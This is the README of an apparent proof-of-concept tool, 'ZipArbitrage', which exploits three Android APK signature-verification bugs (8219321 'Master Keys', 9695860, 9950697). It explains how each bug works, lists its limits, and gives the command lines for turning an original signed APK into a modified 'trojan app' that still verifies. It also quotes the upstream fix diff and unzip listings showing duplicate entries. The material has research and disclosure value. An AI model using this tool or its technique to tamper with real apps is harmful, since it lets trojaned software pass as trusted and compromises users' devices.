Zip File Arbitrage
===================

This project includes a proof of concept for Android bug 8219321, 9695860, and 9950697
## Android bug 9950697

This bug is the newest and also the most exploitable.  ZipArbitrage uses this bug by default.  General idea here is: it was assumed that the length of the filename (and the filename) is the same in both the local file header as well as the central directory.  Description of its workings [here](http://www.saurik.com/id/19).  

This bug is a bit more limited 
   - Files must already exist in original APK
   - Filename + original filelength < 64K
   - New fileLength < original filelength 

Run it as:
```
java -jar bin/AndroidZipArbitrage.jar Orig.apk modifiedAPK.apk
```
Fix commited here:
```
commit 2da1bf57a6631f1cbd47cdd7692ba8743c993ad9
Author: Elliott Hughes <enh@google.com>
Date:   Sun Jul 21 14:34:12 2013 -0700

    Fix ZipFile local file entry parsing.

    The file name length is given in both the central directory entry
    and the local file entry, with no consistency check. ZipInputStream
    and the VM's native code both use the local file entry's value but
    ZipFile was using the value from the central directory.

    This patch makes ZipFile behave like the other two. (Even though,
    unlike the others, ZipFile actually has enough information to detect the
    inconsistency and reject the file.)

    Bug: https://code.google.com/p/android/issues/detail?id=57851
    Bug: 9950697
    Change-Id: I1d58ac523ad2024baff1644d7bf822dae412495d
    (cherry picked from commit 257d72c1b3a69e0af0abe44801b53966dbf7d214)

diff --git a/luni/src/main/java/java/util/zip/ZipFile.java b/luni/src/main/java/java/util/zip/ZipFile.java
index 2f9e3b0..832235e 100644
--- a/luni/src/main/java/java/util/zip/ZipFile.java
+++ b/luni/src/main/java/java/util/zip/ZipFile.java
@@ -284,17 +284,20 @@ public class ZipFile implements Closeable, ZipConstants {
                 throw new ZipException("Invalid General Purpose Bit Flag: " + gpbf);
             }

-            // At position 28 we find the length of the extra data. In some cases
-            // this length differs from the one coming in the central header.
-            is.skipBytes(20);
-            int localExtraLenOrWhatever = Short.reverseBytes(is.readShort()) & 0xffff;
+            // Offset 26 has the file name length, and offset 28 has the extra field length.
+            // These lengths can differ from the ones in the central header.
+            is.skipBytes(18);
+            int fileNameLength = Short.reverseBytes(is.readShort()) & 0xffff;
+            int extraFieldLength = Short.reverseBytes(is.readShort()) & 0xffff;
             is.close();

-            // Skip the name and this "extra" data or whatever it is:
-            rafStream.skip(entry.nameLength + localExtraLenOrWhatever);
+            // Skip the variable-size file name and extra field data.
+            rafStream.skip(fileNameLength + extraFieldLength);
+
+            // The compressed or stored file data follows immediately after.
             rafStream.length = rafStream.offset + entry.compressedSize;
             if (entry.compressionMethod == ZipEntry.DEFLATED) {
-                int bufSize = Math.max(1024, (int)Math.min(entry.getSize(), 65535L));
+                int bufSize = Math.max(1024, (int) Math.min(entry.getSize(), 65535L));
                 return new ZipInflaterInputStream(rafStream, new Inflater(true), bufSize, entry);
             } else {
                 return rafStream;
```

## Android bug 9695860

Jay Saurik found a very nice way to utilize bug 9695860. He describes it far better than I could [here](http://www.saurik.com/id/18). I did not implement the advanced interleaving that he mentions here, but I did implement the ability to have more or less entries in the trojan app.  There are basically no limitations with this exploit.  In addition, this bug is patched on way less devices than AndroidMasterKeys.

The ```--9695860``` switch makes this tool use bug 9695860.

Run it as:
```
java -jar bin/AndroidZipArbitrage.jar --9695860 Orig.apk modifiedAPK.apk
```


## Android bug 8219321 aka Android Master Keys


This is a POC example for Android bug 8219321 (master keys):
  - [Well Written Explaination by Al Sutton](https://plus.google.com/113331808607528811927/posts/GxDA6111vYy)
  - [CyanogenMod Bug Report](https://jira.cyanogenmod.org/browse/CYAN-1602)
  - [CyanogenMod Patch](http://review.cyanogenmod.org/#/c/45251/)
  - [Blue Boxes' teaser of Blackhat talk](http://bluebox.com/corporate-blog/bluebox-uncovers-android-master-key/)
  - [POF's original POC](https://gist.github.com/poliva/36b0795ab79ad6f14fd8)
  - [Rekey.io - A Root framework patcher](http://www.rekey.io/)

Run it as:
```
java -jar bin/AndroidZipArbitrage.jar --8219321 Orig.apk modifiedAPK.apk
```

Please note that -most- ZIP libraries do not handle doing this properly.  UNIX zip's append will not allow file name collisions. It may be able to be done in Python, but it's default ZipFile append method only will add files in non-compressed.

The output from this [POC](https://gist.github.com/poliva/36b0795ab79ad6f14fd8) gives: 
```
➜  AndroidMasterKeys git:(master) unzip -vl pythonModdedApp.apk
Archive:  pythonModdedApp.apk
 Length   Method    Size  Ratio   Date   Time   CRC-32    Name
--------  ------  ------- -----   ----   ----   ------    ----
  506712  Defl:N   196197  61%  07-08-13 21:53  81ab41c8  classes.dex
    1664  Stored     1664   0%  07-08-13 21:51  db586380  AndroidManifest.xml
  506720  Stored   506720   0%  07-08-13 21:51  1fee85e8  classes.dex
     194  Stored      194   0%  07-08-13 21:51  463e5f86  library.properties
     776  Stored      776   0%  07-08-13 21:51  be507dd3  META-INF/CERT.RSA
     515  Stored      515   0%  07-08-13 21:51  1e40193c  META-INF/CERT.SF
     462  Stored      462   0%  07-08-13 21:51  de81958e  META-INF/MANIFEST.MF
     692  Stored      692   0%  07-08-13 21:51  d2d5c7bb  res/layout/main.xml
     856  Stored      856   0%  07-08-13 21:50  eac524bd  resources.arsc
    1761  Stored     1761   0%  07-08-13 21:51  e23c7570  rootdoc.txt
--------          -------  ---                            -------
 1020352           709837  30%                            10 files
 ```
 
 This tool takes proper care to not duplicate any files, while at the same time making sure that all 'appended' files are also compressed. 


 ```
unzip -vl AndroidMasterKeysModded.apk
Archive:  AndroidMasterKeysModded.apk
 Length   Method    Size  Ratio   Date   Time   CRC-32    Name
--------  ------  ------- -----   ----   ----   ------    ----
  506712  Defl:N   195600  61%  07-08-13 21:53  81ab41c8  classes.dex
     692  Defl:N      311  55%  07-08-13 21:51  d2d5c7bb  res/layout/main.xml
    1664  Defl:N      621  63%  07-08-13 21:51  db586380  AndroidManifest.xml
     856  Stored      856   0%  07-08-13 21:50  eac524bd  resources.arsc
  506720  Defl:N   190564  62%  07-08-13 21:51  1fee85e8  classes.dex
     194  Defl:N      144  26%  07-08-13 21:51  463e5f86  library.properties
    1761  Defl:N      741  58%  07-08-13 21:51  e23c7570  rootdoc.txt
     462  Defl:N      298  36%  07-08-13 21:51  de81958e  META-INF/MANIFEST.MF
     515  Defl:N      330  36%  07-08-13 21:51  1e40193c  META-INF/CERT.SF
     776  Defl:N      604  22%  07-08-13 21:51  be507dd3  META-INF/CERT.RSA
--------          -------  ---                            -------
 1020352           390069  62%                            10 files
 ```
 
To hack on the project download SBT run the following to build a jar:
```
sbt assembly
```
You can also add the gen-idea plugin and generate IntelliJ project files as well.
